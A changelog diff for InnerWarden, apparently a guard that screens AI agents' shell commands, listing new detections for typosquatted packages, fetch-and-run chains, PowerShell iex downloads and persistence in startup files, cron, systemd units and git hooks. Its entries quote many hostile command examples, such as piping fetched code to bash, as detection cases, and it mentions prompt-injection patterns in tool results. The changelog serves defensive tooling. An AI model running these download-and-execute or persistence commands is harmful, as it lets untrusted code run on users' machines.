@@ -3,6 +3,234 @@
 All notable changes to InnerWarden are documented here. This project
 follows semantic versioning.
 
+## Unreleased
+
+### Upgrade notes: what to do
+
+- **An agent can no longer install a package whose name is one letter off a
+  popular one.** `pip install reqeusts` or `npm install expresss` run by an
+  agent is now held for review and blocked under the default policy; run by
+  you with `innerwarden check` it is `review`, never `deny`. The same holds
+  when the look-alike is run or downloaded (`npx expresss`, `uvx pytset`,
+  `pip download reqeusts`). If a package you really use is held, install it
+  yourself, or allow it for the agent.
+- **An agent command the guard cannot parse is held when it fetches and
+  runs.** A command that does not parse as shell and names both a download
+  (curl, wget, aria2c, axel, a Python or Node network one-liner) and a way to
+  run code (sh, bash, eval, source, `./file`, `chmod +x`, an interpreter) is
+  `review` and blocked for an agent. One that names only one of the two, or
+  neither, is unchanged.
+- **`innerwarden status` counts only what your agents sent.** A check you ran
+  by hand (and every drill or verify run) is no longer counted as proof that
+  your agent's commands reach the guard, so an install whose agent has not
+  run a command since it was wired now says so instead of reading as on and
+  screening.
+
+### Added
+
+- **Look-alike package names are caught on install.** An install through
+  pip, pipx, uv, poetry, pipenv, npm, yarn, pnpm or bun that names a package
+  one edit away (a letter added, dropped, changed, or two swapped) from a
+  popular PyPI or npm package, and is not itself a known package, is flagged
+  `package_typosquat` and named with the package it imitates. This is how
+  typosquatted packages, and package names an AI agent made up, get
+  installed. Real packages that sit one letter from each other (scipy and
+  scapy, react and preact) are known and pass. Names shorter than five
+  letters are never compared. The list ships in the repository
+  (`crates/agent-guard/data/popular-packages.txt`).
+- **Look-alike names are caught when a package is run or downloaded, not
+  only installed.** `npx`, `npm exec`, `pnpm dlx`, `yarn dlx`, `bunx`,
+  `uvx`, `uv tool run`, `uv tool install`, `pipx run`, `pip download` and
+  `pip wheel` are read with the same list and rules, including the package
+  named by `npx -p`, `uvx --from`/`--with` and `pipx run --spec`. A run
+  executes the package the moment it lands, and a source download runs its
+  build code. Only the run's package is read: what follows it is that
+  package's own arguments, so `pipx run cowsay reqeusts` is no longer
+  flagged for its argument.
+- **A fetch-and-run the shell grammar cannot parse is held.** When the
+  parser rejected a command no structural check ran, and the fallback only
+  fired if a text rule had already recognised the shape, so
+  `aria2c URL -o r && chmod +x r && ./r )`, or a Python one-liner that saves
+  a payload followed by `bash r.sh )`, was allowed. An unparseable command
+  that names both a fetch and a way to run code is now `fetch_exec_unparsed`:
+  review, blocked for an agent.
+- **Library users: a connected agent's registry row keeps its systemd unit.**
+  `Registry::connect` records the system service the process runs in, read
+  only from the cgroup the kernel reports for it, so the row survives a
+  service restart that changes the pid. `ConnectedAgent`, `PersistedAgent`
+  and `AgentSummary` gain `systemd_unit`; `connect_with_facts_and_unit` is
+  new. Registry files written by an earlier version load unchanged, and a row
+  without a unit is written without the key.
+
+### Changed
+
+- **`innerwarden --version` names the paid release too.** With Active
+  Defence installed it adds, on stderr, that `innerwarden-ctl --version`
+  gives the host stack's release. stdout stays one line.
+- **`upgrade` names what is still running the old binary correctly.** Its
+  closing advice called whatever answered on 127.0.0.1:8787 "the dashboard".
+  It now names the Community dashboard on 8788 and an `innerwarden serve` on
+  8787 each by its own answer, and says nothing about anything else.
+
+### Fixed
+
+- **A download run in two steps is caught.** `f=$(curl -s URL) && echo "$f"
+  > /tmp/r.sh && sh /tmp/r.sh` was allowed, and so were the same steps with
+  `wget`, `printf`, `tee`, here-strings, heredocs, `cat >`, a copy of the
+  file, or `chmod +x` and `./r.sh`. A value fetched into a shell variable is
+  now followed into the file it is written to, and running that file is
+  screened like any other downloaded script (review, and blocked for an
+  agent; denied when the fetch has no TLS, a bare IP, a paste host or a
+  decoder). Feeding the variable to a shell's input (`sh <<<"$f"`) is denied.
+  Writing a fetched value to a file nobody runs (`echo "$f" > data.json`)
+  stays allowed.
+- **A download through another tool, then run, is caught like curl's.**
+  `aria2c URL -o r && chmod +x r && ./r`, the same with `axel`,
+  `lwp-download URL r.sh && sh r.sh`, BSD `fetch URL && sh r.sh`, and a
+  Python, Node, Perl, Ruby or PHP one-liner that fetches and writes a file
+  (`urlretrieve`, `urlopen` or `requests.get` then `open(...).write`,
+  `fetch` then `writeFileSync`, LWP `getstore`/`mirror`, `open-uri` then
+  `File.write`, `file_get_contents` then `file_put_contents`) followed by
+  running that file were allowed while the curl and wget forms were held.
+  They now score the same: review, blocked for an agent, denied with the same
+  aggravating evidence. A one-liner that only prints, and a download nobody
+  runs, stay allowed.
+- **A command written into a shell startup file is screened as a command.**
+  `echo 'curl http://x | bash' >> ~/.bashrc` (and the same with `printf`,
+  `tee -a`, a here-string, or a heredoc into `.bashrc`, `.bash_profile`,
+  `.profile`, `.zshrc`, `/etc/profile.d/` and the other startup files) was
+  allowed: the written text is literal output, so only the profile write was
+  scored. The text is now analysed as the command it becomes at the next
+  login, and it scores what running it directly scores, plus the
+  persistence. `export PATH=...` and `alias` lines analyse to nothing and
+  stay allowed. A line that is itself flagged when run directly is flagged
+  when written too.
+- **More ways to fetch and run are caught.**
+  - `ssh host cat x | bash` and `ssh host cat x > f && sh f`; `aws ssm
+    get-parameter`, `aws secretsmanager get-secret-value` and `vault kv get`
+    piped to a shell; files fetched by `ftp`, `lftp`, `tftp` or `smbclient`
+    (`get`) and by `nc host port > f`, then run.
+  - Archives unpacked by `cpio -i`, `rpm2cpio | cpio`, `ar x`, `dpkg -x`,
+    `jar xf`, `unrar x` or `cabextract`, then run; `tar --to-command` on a
+    fetched archive.
+  - A fetched package installed: `pip install ./x.whl`,
+    `npm install ./x.tgz`, `dpkg -i x.deb`, `rpm -i x.rpm`,
+    `apk add --allow-untrusted x.apk` (install scripts run).
+  - PowerShell: `iwr|irm|Invoke-WebRequest|Invoke-RestMethod ... | iex`,
+    `iex (iwr ...)`, `DownloadString` with `IEX`, the same inside
+    `powershell -c "..."`, and an `-EncodedCommand` that decodes to it
+    (denied: a decoder).
+  Each scores like the curl form (review, blocked for an agent; denied with
+  the same aggravating evidence).
+- **Commands written into files that run later are scored as commands.**
+  Besides the shell startup files: `~/.bash_logout`, `~/.ssh/rc`, a
+  `PROMPT_COMMAND` value, git hooks, a desktop autostart `Exec=` line, a
+  systemd unit's `ExecStart=` lines (including a heredoc), `/etc/cron.d`
+  files and lines piped or heredoc-fed to `crontab -`. An inert value
+  (`PROMPT_COMMAND='history -a'`, an ordinary backup job) is unchanged.
+- **A clone that is built or run is recorded, and scored only with
+  hostile evidence.** `git clone URL && cd repo && make` (or `./install.sh`,
+  `npm install`, `pip install .`) gets a low `clone_and_run` signal and is
+  allowed, because developer agents clone and build all day. With no TLS, a
+  bare public IP, or a paste or short-link host it scores as a
+  download-and-run (deny).
+- **Running something from a fetched archive is caught.**
+  `curl -LO URL/a.tgz && tar xzf a.tgz && ./a/run`,
+  `curl -sL URL | tar xz && cd pkg && ./install.sh`,
+  `git archive --remote=R HEAD | tar -x && sh x.sh`, an `aws s3 cp` of a
+  zip unpacked with `unzip` and run, and the same through `7z x`, `bsdtar`,
+  `python -m zipfile -e`/`tarfile -e`, or `gunzip`/`xz -d` first, were
+  allowed: the download never names the file that runs. A fetched or
+  remotely read archive unpacked in the same command now marks what it
+  wrote (its `-C`/`-d`/`-o` directory, or the working directory), and
+  running a path from there scores like the plain download-and-run (review,
+  blocked for an agent). Unpacked and only listed or read stays allowed.
+- **Code read from an object store, a cluster, a container or another host
+  is treated as fetched.** `aws s3 cp s3://b/k - | bash`,
+  `source <(aws s3 cp s3://b/k -)`, `gsutil cat`/`gcloud storage cat` piped
+  to a shell, `kubectl get ... -o jsonpath=... > r.sh && sh r.sh`,
+  `kubectl exec pod -- cat x | bash`, `docker run img cat x | sh`,
+  `rclone cat remote:x | bash`, `scp host:/x . && bash x`,
+  `rsync -a host:/x ./x && ./x`, `kubectl cp`/`docker cp` then run,
+  `az storage blob download --file x && bash x` and
+  `git show origin/main:x | bash` were allowed: only HTTP downloaders
+  counted as a fetch. They now score like the curl form (review, blocked for
+  an agent; deny when sourced or evaluated). A copy that keeps the source's
+  mode (`rsync -a`, `scp -p`, `kubectl cp`, `docker cp`) counts as already
+  executable. Copies nobody runs, uploads, `kubectl get -o yaml > f`,
+  `kubectl exec pod -- ls`, and `kubectl`/`helm completion` stay allowed.
+- **A tool's own shell setup line is no longer refused as fetched code.**
+  `source <(kubectl completion bash)`, `source <(helm completion bash)`,
+  `eval "$(gh completion -s bash)"`, `source <(rustup completions bash)`,
+  `eval "$(pyenv init -)"`, `eval "$(direnv hook bash)"` and
+  `eval "$(starship init bash)"` were denied, run directly or written into
+  `~/.bashrc`: any substitution sourced or evaluated counted as fetched
+  code. One installed program printing its setup, in a command that fetches
+  nothing, is now allowed. A substitution that fetches, decodes, prints
+  code the command wrote itself (`echo`, `printf`, a heredoc, `python -c`),
+  runs a file from the working directory or a temp directory, or sits in a
+  command that fetches anything is still denied
+  (`source <(curl ...)`, `eval "$(curl ... | base64 -d)"`).
+- **Running a file after `cd` into a temp directory is seen.**
+  `cd /tmp && ./x`, `cd /dev/shm; sh p`, `pushd /var/tmp`, and a `cd` into a
+  directory the same command made with `mktemp -d` were allowed: the
+  temp-directory check only matched `/tmp/x` written out. The working
+  directory the command moves into is now followed, so running a relative
+  file from there is flagged like `/tmp/x` (review on its own, and a
+  fetch-and-run there is denied). `cd /tmp && ls` or `cat x` runs nothing
+  from it and stays allowed. A subshell's `cd` ends with the subshell, so
+  `(cd /tmp && ls); ./build.sh` is not flagged, while `(cd /tmp && ./x)` and
+  `{ cd /tmp; ./x; }` are.
+- **Sourcing a downloaded file with `.` is seen.** `curl -o r.sh URL && .
+  ./r.sh` was allowed while `source ./r.sh` was caught.
+- **An MCP wrapper whose proxy binary is gone is not reported as guarded.**
+  The agent list, the dashboard and `status` judged an MCP agent's wrapper by
+  its text, so a config pointing at a removed or moved `innerwarden` read
+  "guarded" while every one of its servers failed to start. It now says the
+  proxy program does not exist and offers `innerwarden agents connect <name>`
+  in the mode the wrappers had. Nothing is unwrapped.
+
+### Project
+
+- The benchmark gate holds the new cases: 245 attacks caught, every command
+  attack blocked for an agent, fetch-and-runs after `cd` into a temp
+  directory denied, startup-file writes charged for what they write, and 0
+  of 160 ordinary commands flagged
+  (including unparseable ones that only fetch or only run, `npx`/`uvx` runs
+  of real packages, downloads through aria2c, axel and lwp-download that are
+  not run, network one-liners that only print or save data, and `cd /tmp`
+  followed by commands that run nothing from it).
+- The OWASP Agentic map (`crates/agent-guard/OWASP-AGENTIC-TOP-10.md`) no
+  longer says every download-and-execute and temp-dir executable is denied.
+  Its ASI05 row now says what the benchmark measures: a plain fetch-and-run
+  over TLS from a named host is review and blocked for an agent; no TLS, a
+  bare IP, a paste or short-link host, a decoder, or fetched bytes reaching
+  an interpreter by substitution, `eval` or a nested shell is deny; reverse
+  shells are deny; an obfuscated payload is review and blocked for an agent;
+  a temp-dir executable alone is review and not blocked for an agent. It
+  also says the guard judges one command at a time, and that a clone built
+  in the same command is allowed unless its source is hostile.
+- The same map's other rows now say only what the code does: ASI01 counts
+  27 prompt-injection patterns (it said 24) and says an injected tool result
+  is a review alert, not blocked; ASI02 says non-blocking dangerous-command
+  patterns are review, not deny; ASI03 names the credential signals
+  Community actually emits (it listed `credential_access`, which no rule
+  emits, and Active Defence's privilege-provenance signals as Community's);
+  ASI10 states the measured split (destruction, tampering, miners and
+  reverse shells deny; scheduled tasks and services review and blocked for
+  an agent; a shell-profile write alone allowed).
+- The release job fails when the `guard-vX.Y.Z` source tag is missing or
+  names a different commit than the one it built.
+- A test pins that the `.deb` and `.rpm` ship `/usr/bin/innerwarden` and no
+  `iw` shortcut (`iw` is the Linux wireless tool's name).
+- The coverage job reads its configuration again (the engine name is
+  case-sensitive, so the 75% floor and the excludes were silently ignored)
+  and fails if the configuration is ever rejected.
+- Every dashboard journey test runs at a fixed clock, so the suite no longer
+  breaks when the calendar moves past its fixtures.
+- The CLI's tests are no longer answered by an `innerwarden-ctl` installed on
+  the machine running them.
+
 ## 1.5.2 - 2026-10-07
 
 ### Upgrade notes: what to do
